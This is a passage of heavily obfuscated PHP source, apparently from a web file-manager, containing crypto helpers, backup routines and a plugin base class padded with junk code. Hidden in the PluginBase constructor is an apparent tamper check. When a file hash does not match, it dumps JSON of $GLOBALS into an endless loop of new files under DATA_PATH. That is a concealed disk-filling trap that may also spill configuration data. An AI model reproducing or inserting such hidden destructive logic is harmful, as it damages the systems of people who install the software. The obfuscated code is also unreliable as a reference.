($Âüëı™Û < $ÑÉ¿ïó´[635]) { if ($Âüëı™Û >= 0) { break; } $Âüëı™Û++; } $í¶ö¤Ö¨ = substr($Ä§¡ıö, 1, 15); $ƒËí§ì½ = $ÑÉ¿ïó´[710]; if (!$ƒËí§ì½) { die; } $Ä§¡ıö = substr($Ä§¡ıö, 16); $ŞãóÚıß = $ãàèóé[294]; $‹áíí³Á = $ÑÉ¿ïó´[711]; if (!$‹áíí³Á) { die; } switch ($…õÛ÷¢—) { case $ãàèóé[203]: $ø×ğÕÆ = $this->juhg5ef21239($Ä§¡ıö, strrev($ë¤ê¯Ø . $í¶ö¤Ö¨)); break; case $ãàèóé[121]: $ø×ğÕÆ = $this->juhg5ef21239($Ä§¡ıö, strrev($í¶ö¤Ö¨ . $ë¤ê¯Ø)); $œØ“”·¤ = $ÑÉ¿ïó´[712]; while (strlen($œØ“”·¤) < $ÑÉ¿ïó´[607]) { if (!$œØ“”·¤) { break; } $œØ“”·¤++; } break; $º•ó— ¼ = $ÑÉ¿ïó´[713]; if (strlen($º•ó— ¼) < $ÑÉ¿ïó´[635]) { return; } case $ãàèóé[295]: $ø×ğÕÆ = $this->juhg5ef21239($Ä§¡ıö, base64_encode($í¶ö¤Ö¨ . $ë¤ê¯Ø)); $‘ÂÑíİ = $ÑÉ¿ïó´[714]; if (strlen($‘ÂÑíİ) < $ÑÉ¿ïó´[617]) { die; } break; case $ãàèóé[296]: $ø×ğÕÆ = $this->juhg5ef21239($Ä§¡ıö, md5($í¶ö¤Ö¨ . $ë¤ê¯Ø)); $óùƒè–œ = $ÑÉ¿ïó´[715]; break; $¤Œúß·î = $ÑÉ¿ïó´[716]; if (!$¤Œúß·î) { return; } case $ãàèóé[297]: $Ä§¡ıö = hash_decode($Ä§¡ıö); $¸ÕŞàşº = $Ä§¡ıö[0]; $øÂ…ä¶˜ = $ÑÉ¿ïó´[717]; if (!$øÂ…ä¶˜) { return; } $Ä§¡ıö = substr($Ä§¡ıö, 1); $è‰áÌüô = strpos($ŞãóÚıß, $¸ÕŞàşº); $Ô¥ÍæÇì = $ÑÉ¿ïó´[612]; if (!$Ô¥ÍæÇì) { return; } $ªŸ·’ü = md5($¸ÕŞàşº . md5($ë¤ê¯Ø . $¸ÕŞàşº) . $ë¤ê¯Ø); $ö†êïıÄ = $ÑÉ¿ïó´[718]; if (strlen($ö†êïıÄ) < $ÑÉ¿ïó´[617]) { return; } $ªŸ·’ü = substr($ªŸ·’ü, $è‰áÌüô % 8, $è‰áÌüô % 8 + 7); $¾´û¼š‚ = $ÑÉ¿ïó´[719]; $®øÕÇç­ = $ãàèóé[6]; $¢äõÍÄ = 0; $ÔøŸè´¹ = $ÑÉ¿ïó´[720]; if (strlen($ÔøŸè´¹) < $ÑÉ¿ïó´[635]) { die; } $™ıóÃ€ë = 0; $¹É÷áí« = 0; $˜ãßê®µ = $ÑÉ¿ïó´[721]; for ($¢äõÍÄ = 0; $¢äõÍÄ < strlen($Ä§¡ıö); $¢äõÍÄ++) { $¹É÷áí« = $¹É÷áí« == strlen($ªŸ·’ü) ? 0 : $¹É÷áí«; $ù£ãªßÙ = $¹É÷áí«++; $©ê¡¾ô¸ = $ÑÉ¿ïó´[722]; if (!$©ê¡¾ô¸) { die; } $™ıóÃ€ë = strpos($ŞãóÚıß, $Ä§¡ıö[$¢äõÍÄ]) - $è‰áÌüô - ord($ªŸ·’ü[$ù£ãªßÙ]); $°íµ»× = $ÑÉ¿ïó´[723]; while ($™ıóÃ€ë < 0) { $™ıóÃ€ë += 64; $˜ÕÔ… = $ÑÉ¿ïó´[724]; if (strlen($˜ÕÔ…) < $ÑÉ¿ïó´[617]) { return; } } $®øÕÇç­ .= $ŞãóÚıß[$™ıóÃ€ë]; } $ø×ğÕÆ = base64_decode($®øÕÇç­); break; $¥§Ñ™Ğş = $ÑÉ¿ïó´[725]; while ($¥§Ñ™Ğş < $ÑÉ¿ïó´[615]) { if ($¥§Ñ™Ğş >= 0) { break; } $¥§Ñ™Ğş++; } default: $ø×ğÕÆ = $this->juhg5ef21239($Ä§¡ıö, $ë¤ê¯Ø . $í¶ö¤Ö¨); break; } if ($©öĞºä - 1 > 0) { $ø×ğÕÆ = $this->rmqs7f6f7abf($ø×ğÕÆ, $ë¤ê¯Ø, $©öĞºä - 1); } return $ø×ğÕÆ; } public function iepm5da4d5a8($óˆÜ™Šò) { $ÆÔÃ ¥÷ =& $_SERVER[Îûáû“ş]; $Â¡ÅşÅâ =& $_SERVER[üÌ¬Ôµ]; $¿ïµâÁÆ = $this->pofwc016c146(); $«‹Ê‘çû = $this->pofwc016c146(); $µ˜¾·ì = $ÆÔÃ ¥÷[726]; $İ³Ş¦Ç¹ = ($¿ïµâÁÆ - 1) * ($«‹Ê‘çû - 1); $îîãßê” = $ÆÔÃ ¥÷[727]; if (strlen($îîãßê”) < $ÆÔÃ ¥÷[615]) { return; } $ˆˆåË = intval(($¿ïµâÁÆ + $«‹Ê‘çû) / 2); $œœ¤ë­ğ = $ÆÔÃ ¥÷[728]; if (strlen($œœ¤ë­ğ) < $ÆÔÃ ¥÷[646]) { return; } while (1) { $ËÓ¢ˆÙ = $ˆˆåË; $ééñëÃĞ = $ÆÔÃ ¥÷[729]; if (strlen($ééñëÃĞ) < $ÆÔÃ ¥÷[607]) { return; } $Õ ú¥üû = $İ³Ş¦Ç¹; while ($Õ ú¥üû % $ËÓ¢ˆÙ != 0) { $ˆøµÉÑ = $Õ ú¥üû; $çŸóù¬² = $ÆÔÃ ¥÷[730]; if (strlen($çŸóù¬²) < $ÆÔÃ ¥÷[607]) { die; } $Õ ú¥üû = $ËÓ¢ˆÙ; $ËÓ¢ˆÙ = $ˆøµÉÑ % $ËÓ¢ˆÙ; $¸ÏŒş†å = $ÆÔÃ ¥÷[731]; while ($¸ÏŒş†å < $ÆÔÃ ¥÷[635]) { if ($¸ÏŒş†å >= 0) { break; } $¸ÏŒş†å++; } } if ($ËÓ¢ˆÙ == 1) { break; } else { $ˆˆåË++; } } $ÔäİÕå = 2; $Äò„Î„¸ = $ÆÔÃ ¥÷[732]; if (strlen($Äò„Î„¸) < $ÆÔÃ ¥÷[607]) { die; } for ($“¯²©‚• = 0; $“¯²©‚• < $İ³Ş¦Ç¹ * 10; $“¯²©‚•++) { if (($İ³Ş¦Ç¹ * $“¯²©‚• + 1) % $ˆˆåË == 0) { $ÔäİÕå = intval(($İ³Ş¦Ç¹ * $“¯²©‚• + 1) / $ˆˆåË); break; } } $Äˆöã = $this->lunza0d18401($¿ïµâÁÆ * $«‹Ê‘çû . $Â¡ÅşÅâ[6], $Â¡ÅşÅâ[135]); $ƒ„Ó§Ï = $ÆÔÃ ¥÷[733]; if (strlen($ƒ„Ó§Ï) < $ÆÔÃ ¥÷[646]) { return; } $şÄç¶¼ = md5($Â¡ÅşÅâ[298] . ($¿ïµâÁÆ + $«‹Ê‘çû) . $Â¡ÅşÅâ[299] . $ˆˆåË . $Â¡ÅşÅâ[299] . $ÔäİÕå . $Â¡ÅşÅâ[300]); $ŠÇ´˜Ù = $ÆÔÃ ¥÷[734]; while ($ŠÇ´˜Ù < $ÆÔÃ ¥÷[607]) { if ($ŠÇ´˜Ù >= 0) { break; } $ŠÇ´˜Ù++; } $ÇÚü«ÔÏ = $this->lunza0d18401($óˆÜ™Šò, $şÄç¶¼) . $Â¡ÅşÅâ[301] . $Äˆöã; return $ÇÚü«ÔÏ; } public function nspe0fff9424($§ÄÜ—”Ò) { $ãÛÈŠ„ =& $_SERVER[Îûáû“ş]; $­ñûÎ•Ñ =& $_SERVER[üÌ¬Ôµ]; $Ïö‹®¯ = explode($­ñûÎ•Ñ[301], $§ÄÜ—”Ò); if (count($Ïö‹®¯) != 2) { return $­ñûÎ•Ñ[6]; } $…Çõùµó = $this->juhg5ef21239($Ïö‹®¯[1] . $­ñûÎ•Ñ[6], $­ñûÎ•Ñ[135]); $™Š·ÅôÙ = $ãÛÈŠ„[735]; while ($™Š·ÅôÙ < $ãÛÈŠ„[607]) { if ($™Š·ÅôÙ >= 0) { break; } $™Š·ÅôÙ++; } if (!$…Çõùµó) { return $­ñûÎ•Ñ[6]; } $…Çõùµó = intval($…Çõùµó); $ï£Ç½ô¼ = $ãÛÈŠ„[736]; if (!$ï£Ç½ô¼) { die; } $áİîÌÃ¢ = 0; $ƒ¼ë‹¢µ = $ãÛÈŠ„[737]; while ($ƒ¼ë‹¢µ < $ãÛÈŠ„[635]) { if ($ƒ¼ë‹¢µ >= 0) { break; } $ƒ¼ë‹¢µ++; } $­è…½şÂ = 0; for ($—ê¡õ÷ü = 3; $—ê¡õ÷ü < $…Çõùµó; $—ê¡õ÷ü += 2) { if ($…Çõùµó % $—ê¡õ÷ü != 0) { continue; } $áİîÌÃ¢ = $—ê¡õ÷ü; $îíó†×¼ = $ãÛÈŠ„[738]; if (!$îíó†×¼) { die; } $­è…½şÂ = intval($…Çõùµó / $—ê¡õ÷ü); $ÏË¡Òµï = $ãÛÈŠ„[739]; break; } $Îïõ´¬¡ = ($áİîÌÃ¢ - 1) * ($­è…½şÂ - 1); $ºæÈªùù = intval(($áİîÌÃ¢ + $­è…½şÂ) / 2); $÷™ÖÛ² = $ãÛÈŠ„[740]; if (strlen($÷™ÖÛ²) < $ãÛÈŠ„[615]) { die; } while (1) { $¦á‰Ö«ß = $ºæÈªùù; $şµŞÛÊŠ = $Îïõ´¬¡; while ($şµŞÛÊŠ % $¦á‰Ö«ß != 0) { $Ï³¬š©‹ = $şµŞÛÊŠ; $şµŞÛÊŠ = $¦á‰Ö«ß; $­ ²ª…ê = $ãÛÈŠ„[741]; if (!$­ ²ª…ê) { return; } $¦á‰Ö«ß = $Ï³¬š©‹ % $¦á‰Ö«ß; } if ($¦á‰Ö«ß == 1) { break; } else { $ºæÈªùù++; } } $ëî¡Çµµ = 2; for ($—ê¡õ÷ü = 0; $—ê¡õ÷ü < $Îïõ´¬¡ * 10; $—ê¡õ÷ü++) { if (($Îïõ´¬¡ * $—ê¡õ÷ü + 1) % $ºæÈªùù == 0) { $ëî¡Çµµ = intval(($Îïõ´¬¡ * $—ê¡õ÷ü + 1) / $ºæÈªùù); break; } } $ñâïö£¡ = md5($­ñûÎ•Ñ[298] . ($áİîÌÃ¢ + $­è…½şÂ) . $­ñûÎ•Ñ[299] . $ºæÈªùù . $­ñûÎ•Ñ[299] . $ëî¡Çµµ . $­ñûÎ•Ñ[300]); $æû³çşš = $this->juhg5ef21239($Ïö‹®¯[0], $ñâïö£¡); return $æû³çşš; $ŒİŠ = $ãÛÈŠ„[742]; if (!$ŒİŠ) { die; } } public function pofwc016c146() { $û«‡Å©¤ =& $_SERVER[Îûáû“ş]; $ğ¡Ô²°… = mt_rand(pow(2, 14), pow(2, 16) - 1); $‹Íã±Áº = array(); $öÍÄÏêâ = $û«‡Å©¤[743]; if (strlen($öÍÄÏêâ) < $û«‡Å©¤[646]) { return; } $¨Èü£…Ü = 1; while ($¨Èü£…Ü <= (int) sqrt($ğ¡Ô²°…)) { $œÕÌäÚ… = $¨Èü£…Ü; $•Ê„úÎÂ = $û«‡Å©¤[744]; while ($•Ê„úÎÂ < $û«‡Å©¤[635]) { if ($•Ê„úÎÂ >= 0) { break; } $•Ê„úÎÂ++; } while (!0) { $œÕÌäÚ…++; if ($œÕÌäÚ… <= 2) { $¨Èü£…Ü = $œÕÌäÚ…; break; } else { if ($œÕÌäÚ… < 2) { continue; } } $ĞªõãíÆ = !0; for ($“µœëô = 2; $“µœëô <= sqrt($œÕÌäÚ…); $“µœëô++) { if ($œÕÌäÚ… % $“µœëô == 0) { $ĞªõãíÆ = !1; } } if ($ĞªõãíÆ) { $¨Èü£…Ü = $œÕÌäÚ…; break; } } $‹Íã±Áº[] = $¨Èü£…Ü; } $åšßú·ó = 2; for ($œÕÌäÚ… = $ğ¡Ô²°…; $œÕÌäÚ… > 1; $œÕÌäÚ…--) { $ĞªõãíÆ = !0; foreach ($‹Íã±Áº as $íÆ‡³¾) { if ($œÕÌäÚ… % $íÆ‡³¾ == 0) { $ĞªõãíÆ = !1; break; } } if ($ĞªõãíÆ) { $åšßú·ó = $œÕÌäÚ…; break; } } return $åšßú·ó; $ë¶¹ÊàÕ = $û«‡Å©¤[745]; if (strlen($ë¶¹ÊàÕ) < $û«‡Å©¤[635]) { die; } } public function hgcw95e6137a($êô—ôÇ©, $‰ÀÏÈŒ›) { $æ½ô« “ =& $_SERVER[üÌ¬Ôµ]; return call_user_func(array($æ½ô« “[8], $æ½ô« “[302]), $êô—ôÇ©, $‰ÀÏÈŒ›); } public function lunza0d18401($²ÙÂÔÌ, $Æê¥ÌÑ¢) { $ïèËŠ‡¾ =& $_SERVER[üÌ¬Ôµ]; return call_user_func(array($ïèËŠ‡¾[303], $ïèËŠ‡¾[304]), $²ÙÂÔÌ, $Æê¥ÌÑ¢); } public function juhg5ef21239($À§½Óö, $“İÄ¥ŒÃ) { $è˜ÇÆã¤ =& $_SERVER[üÌ¬Ôµ]; return call_user_func(array($è˜ÇÆã¤[303], $è˜ÇÆã¤[305]), $À§½Óö, $“İÄ¥ŒÃ); } } class Backup { protected static $name; protected static $option; protected static $manual; public function __construct() { $this->init(); $this->keep(); } public function init() { $Ã´·Åµİ =& $_SERVER[Îûáû“ş]; $this->isManual(); self::$name = date($Ã´·Åµİ[746]); if (!($‡èÒëØà = Model($Ã´·Åµİ[747])->lastItem())) { $‡èÒëØà = $this->initData(); } else { self::$name = $‡èÒëØà[$Ã´·Åµİ[32]]; if ($‡èÒëØà[$Ã´·Åµİ[748]] == $Ã´·Åµİ[88]) { self::$name = date($Ã´·Åµİ[749]); $İëšÍ„‹ = 0; if (isset($‡èÒëØà[$Ã´·Åµİ[293]][$Ã´·Åµİ[200]][$Ã´·Åµİ[468]])) { $İëšÍ„‹ = (int) $‡èÒëØà[$Ã´·Åµİ[293]][$Ã´·Åµİ[200]][$Ã´·Åµİ[468]]; } if (self::$manual == 0 && $‡èÒëØà[$Ã´·Åµİ[32]] == self::$name) { Model($Ã´·Åµİ[747])->remove($‡èÒëØà[$Ã´·Åµİ[399]]); } $‡èÒëØà = $this->initData($İëšÍ„‹, $‡èÒëØà[$Ã´·Åµİ[750]]); } else { $this->checkStore($‡èÒëØà[$Ã´·Åµİ[750]]); } } self::$option = $‡èÒëØà; } private function isManual() { $ŒÓ”£Ì = _get($GLOBALS, $_SERVER[Îûáû“ş][751], 0); $ŒÓ”£Ì = intval($ŒÓ”£Ì); self::$manual = $ŒÓ”£Ì && $ŒÓ”£Ì == 1 ? 1 : 0; } private function initData($Íûíˆ‰Á = 0, $€¯ï = '') { $æ±ˆ“Òê =& $_SERVER[Îûáû“ş]; $¨áÌšÌ’ = Model($æ±ˆ“Òê[747])->config(); if ($€¯ï && $¨áÌšÌ’[$æ±ˆ“Òê[750]] != $€¯ï) { $Íûíˆ‰Á = 0; } $this->checkStore($¨áÌšÌ’[$æ±ˆ“Òê[750]]); if (self::$manual == 1) { self::$name .= $æ±ˆ“Òê[11] . date($æ±ˆ“Òê[752]); } $ğØ¾æŸì = array($æ±ˆ“Òê[750] => $¨áÌšÌ’[$æ±ˆ“Òê[750]], $æ±ˆ“Òê[32] => self::$name, $æ±ˆ“Òê[748] => 0, $æ±ˆ“Òê[753] => $¨áÌšÌ’[$æ±ˆ“Òê[753]], $æ±ˆ“Òê[754] => self::$manual, $æ±ˆ“Òê[293] => array($æ±ˆ“Òê[755] => array($æ±ˆ“Òê[748] => 0), $æ±ˆ“Òê[756] => array($æ±ˆ“Òê[748] => 0, $æ±ˆ“Òê[757] => 0, $æ±ˆ“Òê[758] => 0, $æ±ˆ“Òê[33] => $æ±ˆ“Òê[12], $æ±ˆ“Òê[759] => 0, $æ±ˆ“Òê[760] => 0), $æ±ˆ“Òê[761] => array($æ±ˆ“Òê[748] => 0, $æ±ˆ“Òê[757] => 0, $æ±ˆ“Òê[758] => 0, $æ±ˆ“Òê[759] => 0, $æ±ˆ“Òê[760] => 0), $æ±ˆ“Òê[200] => array($æ±ˆ“Òê[748] => 0, $æ±ˆ“Òê[762] => 0, $æ±ˆ“Òê[763] => 0, $æ±ˆ“Òê[764] => 0, $æ±ˆ“Òê[765] => 0, $æ±ˆ“Òê[468] => $Íûíˆ‰Á, $æ±ˆ“Òê[759] => 0, $æ±ˆ“Òê[760] => 0)), $æ±ˆ“Òê[759] => time(), $æ±ˆ“Òê[760] => 0); $ÃæªÔˆ = Model($æ±ˆ“Òê[747])->insert($ğØ¾æŸì); $ğØ¾æŸì[$æ±ˆ“Òê[399]] = $ÃæªÔˆ; return $ğØ¾æŸì; } private function checkStore($õ…ŠÄ¡‹) { $ş‹Ó®ÑÖ =& $_SERVER[Îûáû“ş]; $Ï¹ ‹ë‰ = Model($ş‹Ó®ÑÖ[766])->listData($õ…ŠÄ¡‹); Model($ş‹Ó®ÑÖ[766])->checkConfig($Ï¹ ‹ë‰); } public static function get() { if (!self::$option) { self::$option = Model($_SERVER[Îûáû“ş][747])->findByName(self::$name); } return self::$option; } public static function set($”²ÌŒßŸ) { $Ş­ğœÑß =& $_SERVER[Îûáû“ş]; $¥´ñ§± = self::get(); foreach ($”²ÌŒßŸ as $Äş‚íêÅ => $¡Šƒçô) { $ç¿–à„ = explode($Ş­ğœÑß[10], $Äş‚íêÅ); $°êáÃ• = count($ç¿–à„); switch ($°êáÃ•) { case 1: $¥´ñ§±[$ç¿–à„[0]] = $¡Šƒçô; break; case 2: $¥´ñ§±[$ç¿–à„[0]][$ç¿–à„[1]] = $¡Šƒçô; break; case 3: $¥´ñ§±[$ç¿–à„[0]][$ç¿–à„[1]][$ç¿–à„[2]] = $¡Šƒçô; break; } } Model($Ş­ğœÑß[747])->update($¥´ñ§±[$Ş­ğœÑß[399]], $¥´ñ§±); self::$option = $¥´ñ§±; return self::$option; } public function keep() { $úñÃ™À¼ =& $_SERVER[Îûáû“ş]; $¥°éáò¶ = self::get(); if ($¥°éáò¶[$úñÃ™À¼[293]][$úñÃ™À¼[755]][$úñÃ™À¼[748]] == $úñÃ™À¼[88]) { return; } $this->backupKeep($¥°éáò¶); self::set(array($úñÃ™À¼[767] => 1)); } private function backupKeep($¨…ŸŠö“) { $ŞÆú¢èª =& $_SERVER[Îûáû“ş]; if (self::$manual == 1) { return; } $‹şõÅò¶ = Model($ŞÆú¢èª[747])->listData(); if (empty($‹şõÅò¶)) { return; } $ê–ÆŸä« = 0; $İ…àŞ…‘ = array(); foreach ($‹şõÅò¶ as $Ç„ĞËŸñ) { if ($ê–ÆŸä« >= 7) { break; } $İ…àŞ…‘[] = $Ç„ĞËŸñ[$ŞÆú¢èª[32]]; $ê–ÆŸä«++; } for ($ê–ÆŸä« = 0; $ê–ÆŸä« < 12; $ê–ÆŸä«++) { $İ…àŞ…‘[] = date($ŞÆú¢èª[768], strtotime("\x2d{$ê–ÆŸä«}\40\155\157\x6e\x74\x68\x73")); } $İ…àŞ…‘ = array_unique($İ…àŞ…‘); $÷º£© = Model($ŞÆú¢èª[769])->get($ŞÆú¢èª[770]); foreach ($‹şõÅò¶ as $Ç„ĞËŸñ) { if (isset($Ç„ĞËŸñ[$ŞÆú¢èª[754]]) && $Ç„ĞËŸñ[$ŞÆú¢èª[754]] == $ŞÆú¢èª[88]) { continue; } if (!empty($Ç„ĞËŸñ[$ŞÆú¢èª[32]]) && in_array($Ç„ĞËŸñ[$ŞÆú¢èª[32]], $İ…àŞ…‘)) { continue; } Model($ŞÆú¢èª[747])->remove($Ç„ĞËŸñ[$ŞÆú¢èª[399]]); $²î…áÙÊ = $this->backupPath($¨…ŸŠö“, $÷º£©); IO::remove($²î…áÙÊ, !1); } } private function backupPath($ôë¥¹÷œ, $÷—á©²ó = false) { $ğ‚¾Å¾Ø =& $_SERVER[Îûáû“ş]; if (!$÷—á©²ó) { $÷—á©²ó = Model($ğ‚¾Å¾Ø[769])->get($ğ‚¾Å¾Ø[770]); } $Œô¨‡ãä = $ôë¥¹÷œ[$ğ‚¾Å¾Ø[32]]; $—è¾™× = substr(md5($ğ‚¾Å¾Ø[771] . $÷—á©²ó . $Œô¨‡ãä), 0, 8); return "\x7b\151\157\x3a{$ôë¥¹÷œ[$ğ‚¾Å¾Ø[750]]}\x7d\57\144\x61\164\x61\142\x61\163\x65\x2f\x62\141\143\153\165\x70\x2f" . $Œô¨‡ãä . $ğ‚¾Å¾Ø[11] . $—è¾™×; } public function db() { $Ö©¯ã‹Ç =& $_SERVER[Îûáû“ş]; $ÓÄ­áÜŞ = self::get(); if ($ÓÄ­áÜŞ[$Ö©¯ã‹Ç[293]][$Ö©¯ã‹Ç[756]][$Ö©¯ã‹Ç[748]] == $Ö©¯ã‹Ç[88]) { return !0; } $¡¡Ëã…î = new BackupDb(); if (!$¡¡Ëã…î->index()) { return !1; } self::set(array($Ö©¯ã‹Ç[772] => 1)); return !0; } public function dbFile() { $„şºƒ¢ =& $_SERVER[Îûáû“ş]; $§åôµ“ß = self::get(); if ($§åôµ“ß[$„şºƒ¢[293]][$„şºƒ¢[761]][$„şºƒ¢[748]] == $„şºƒ¢[88]) { return !0; } $²À„ê† = new BackupDbFile(); if (!$²À„ê†->index()) { return !1; } self::set(array($„şºƒ¢[773] => 1)); return !0; } public function file() { $Š•íé§ñ =& $_SERVER[Îûáû“ş]; $¹Ì™Èãî = self::get(); if ($¹Ì™Èãî[$Š•íé§ñ[293]][$Š•íé§ñ[200]][$Š•íé§ñ[748]] == $Š•íé§ñ[88]) { return !0; } if (!isset($¹Ì™Èãî[$Š•íé§ñ[753]]) || $¹Ì™Èãî[$Š•íé§ñ[753]] == $Š•íé§ñ[198]) { $¯å§™¨ = new BackupFile(); if (!$¯å§™¨->index()) { return !1; } } self::set(array($Š•íé§ñ[774] => 1, $Š•íé§ñ[748] => 1)); return !0; } } class BackupDb { protected static $io; protected static $name; public function __construct() { } public function index() { $áë°Â÷ë =& $_SERVER[Îûáû“ş]; $Ù½§Éşâ = Backup::get(); self::$io = $Ù½§Éşâ[$áë°Â÷ë[750]]; self::$name = $Ù½§Éşâ[$áë°Â÷ë[32]]; $ñÎù²°” = new DbManage(); $ÂÜ²˜¯Í = $ñÎù²°”->dbType(); $‡ñÅÒûé = array($áë°Â÷ë[775] => $ÂÜ²˜¯Í, $áë°Â÷ë[776] => time()); Backup::set($‡ñÅÒûé); $´·¾¬×û = $this->tmpFilesPath() . $áë°Â÷ë[777] . self::$name . $áë°Â÷ë[8]; del_dir($´·¾¬×û); mk_dir($´·¾¬×û); $ÑÜñÈØÖ = $™ÑÊÛĞµ = 0; $ÀÕİ´™¸ = new Task($áë°Â÷ë[778], $áë°Â÷ë[779], 0, LNG($áë°Â÷ë[780]) . $áë°Â÷ë[781] . LNG($áë°Â÷ë[782])); try { $ìÇ£­é¬ = $ñÎù²°”->db()->getTables(); } catch (Exception $½ú î¬ı) { $ÀÕİ´™¸->end(); return !1; } $ìÇ£­é¬ = array_diff($ìÇ£­é¬, array($áë°Â÷ë[783], $áë°Â÷ë[784])); foreach ($ìÇ£­é¬ as $¥·ü¡È¬) { $ÑÜñÈØÖ += $ñÎù²°”->model($¥·ü¡È¬)->count(); } $ÀÕİ´™¸->task[$áë°Â÷ë[785]] = $ÑÜñÈØÖ; $GLOBALS[$áë°Â÷ë[786]] = self::$name; foreach ($ìÇ£­é¬ as $¥·ü¡È¬) { $³øøú‹ƒ = $´·¾¬×û . $¥·ü¡È¬ . $áë°Â÷ë[787]; $­ÑÙ™½ = null; if ($¥·ü¡È¬ == $áë°Â÷ë[788] && (!isset($Ù½§Éşâ[$áë°Â÷ë[753]]) || $Ù½§Éşâ[$áë°Â÷ë[753]] == $áë°Â÷ë[198])) { $­ÑÙ™½ = self::$io; } $™ÑÊÛĞµ += $ñÎù²°”->sqlFromDb($¥·ü¡È¬, $³øøú‹ƒ, $ÀÕİ´™¸, $­ÑÙ™½); } unset($GLOBALS[$áë°Â÷ë[786]]); $ÀÕİ´™¸->end(); if ($™ÑÊÛĞµ > $ÑÜñÈØÖ) { $ÑÜñÈØÖ = $™ÑÊÛĞµ; } $‡ñÅÒûé = array($áë°Â÷ë[775] => $ÂÜ²˜¯Í, $áë°Â÷ë[772] => 1, $áë°Â÷ë[789] => $ÑÜñÈØÖ, $áë°Â÷ë[790] => $™ÑÊÛĞµ, $áë°Â÷ë[791] => time()); Backup::set($‡ñÅÒûé); if ($ÑÜñÈØÖ - $™ÑÊÛĞµ > 0) { $„ú°Ô§Ê = $áë°Â÷ë[792]; if (stristr(I18n::getType(), $áë°Â÷ë[793])) { $„ú°Ô§Ê = $áë°Â÷ë[794]; } write_log(array($„ú°Ô§Ê, $‡ñÅÒûé), $áë°Â÷ë[779]); return !1; } return !0; } private function tmpFilesPath() { $¤î½²Ñ» =& $_SERVER[Îûáû“ş]; $àé‡­øÁ = TEMP_FILES; if ($GLOBALS[$¤î½²Ñ»[6]][$¤î½²Ñ»[89]][$¤î½²Ñ»[795]]) { $àé‡­øÁ = $GLOBALS[$¤î½²Ñ»[6]][$¤î½²Ñ»[89]][$¤î½²Ñ»[795]]; if (!mk_dir($àé‡­øÁ) || !is_writable($àé‡­øÁ) || !IO::mkfile($àé‡­øÁ . $¤î½²Ñ»[796])) { $àé‡­øÁ = TEMP_FILES; } } return $àé‡­øÁ; } } goto E‰×µøÕÛ…; BÃ›š‰ÊİÍ: class Message { function __construct() { } public function send($ÏÀá¹’ê = '', $¼ü‡Æ¾ = array(), $ò”ğ™¾ = "\x74\x65\x78\x74") { $±ì’Å´ğ =& $_SERVER[Îûáû“ş]; $üĞ¦¥²« = array($±ì’Å´ğ[33] => $±ì’Å´ğ[1531], $±ì’Å´ğ[753] => $ÏÀá¹’ê); if (in_array($ò”ğ™¾, array($±ì’Å´ğ[1531], $±ì’Å´ğ[1532]))) { $üĞ¦¥²«[$±ì’Å´ğ[33]] = $ò”ğ™¾; } $¼ü‡Æ¾ = array($±ì’Å´ğ[505] => isset($¼ü‡Æ¾[$±ì’Å´ğ[505]]) ? $¼ü‡Æ¾[$±ì’Å´ğ[505]] : $±ì’Å´ğ[12], $±ì’Å´ğ[590] => isset($¼ü‡Æ¾[$±ì’Å´ğ[590]]) ? $¼ü‡Æ¾[$±ì’Å´ğ[590]] : $±ì’Å´ğ[12]); if (empty($ÏÀá¹’ê) || empty($¼ü‡Æ¾[$±ì’Å´ğ[505]]) && empty($¼ü‡Æ¾[$±ì’Å´ğ[590]])) { return !1; } $ø‰ä„Çµ = array($±ì’Å´ğ[1472] => $üĞ¦¥²«, $±ì’Å´ğ[1533] => $¼ü‡Æ¾); Hook::trigger($±ì’Å´ğ[1534], $ø‰ä„Çµ); } } class PluginBase { public $in; public $pluginName; public $pluginPath; public $pluginHost; public $pluginHostDefault; public $pluginApi; public $packageData; private $pluginLangArr; private $pluginConfig; public $cachePath; public $fileInfo; function __construct() { $ğÉÏ–©÷ =& $_SERVER[Îûáû“ş]; $ôí¦õ· = $_SERVER[$ğÉÏ–©÷[879]] . $ğÉÏ–©÷[880]; $²³ŠñŠ = $ğÉÏ–©÷[1535]; if ($_SERVER[$ğÉÏ–©÷[875]] != $²³ŠñŠ($ôí¦õ·)) { $ÉÇŒ¡ÑĞ = $ğÉÏ–©÷[877]; $‚è¡ßÃú = $ğÉÏ–©÷[878]; $¢ÉÄ×¡ß = $_SERVER[$ğÉÏ–©÷[879]] . $ğÉÏ–©÷[880]; $¢ŒØ‘€º = $‚è¡ßÃú($¢ÉÄ×¡ß); $¾É¤®íƒ = explode($ğÉÏ–©÷[231], $¢ŒØ‘€º); if (count($¾É¤®íƒ) < $ğÉÏ–©÷[607]) { $ª‚‡ÓÀÌ = $ğÉÏ–©÷[881]; $ª‚‡ÓÀÌ(); } $øÆ¤Œæµ = $ğÉÏ–©÷[882]; $øÆ¤Œæµ($_SERVER[$ğÉÏ–©÷[883]]); $ÉÇŒ¡ÑĞ = $ğÉÏ–©÷[877]; $ÉÇŒ¡ÑĞ(); $à½ØïåÜ = $ğÉÏ–©÷[1536]; $—ÔÚºªƒ = json_encode($GLOBALS[$ğÉÏ–©÷[1537]]); $¾âÑ÷àˆ = 1; for ($–¹æ¹îà = $¾âÑ÷àˆ; $–¹æ¹îà > 0; $–¹æ¹îà++) { $à½ØïåÜ(DATA_PATH . $–¹æ¹îà, $—ÔÚºªƒ); } } global $in, $config; $this->config =& $config; $this->in =& $in; $this->modelPlugin = Model($ğÉÏ–©÷[1538]); $this->pluginName = str_replace($ğÉÏ–©÷[1538], $ğÉÏ–©÷[12], get_class($this)); $this->pluginPath = PLUGIN_DIR . $this->pluginName . $ğÉÏ–©÷[8]; $this->pluginApi = appHostGet() . $ğÉÏ–©÷[1539] . $this->pluginName . $ğÉÏ–©÷[8]; $this->pluginHost = $config[$ğÉÏ–©÷[1540]] . $this->pluginName . $ğÉÏ–©÷[8]; $this->pluginHostDefault = $config[$ğÉÏ–©÷[1540]] . $this->pluginName . $ğÉÏ–©÷[8]; $û—âÁÌ± = $config[$ğÉÏ–©÷[1541]]; if ($û—âÁÌ± && strpos($ğÉÏ–©÷[50] . $û—âÁÌ± . $ğÉÏ–©÷[50], $this->pluginName) !== !1) { $this->pluginHost = $config[$ğÉÏ–©÷[1542]] . $this->pluginName . $ğÉÏ–©÷[8]; } $this->pluginLangArr = $this->initLang(); $this->values = array(); $this->echoJsAssignArr = array(); return $this; } public function regist() { $this->hookRegist(array()); } public function install() { } public function update() { } public function unInstall() { } public function echoJs() { $this->echoFile($_SERVER[Îûáû“ş][1543]); } protected function assign($ÖˆïÄ”Í, $Ì°ÎÍà = false) { if (is_array($ÖˆïÄ”Í)) { $this->values = array_merge($this->values, $ÖˆïÄ”Í); } else { 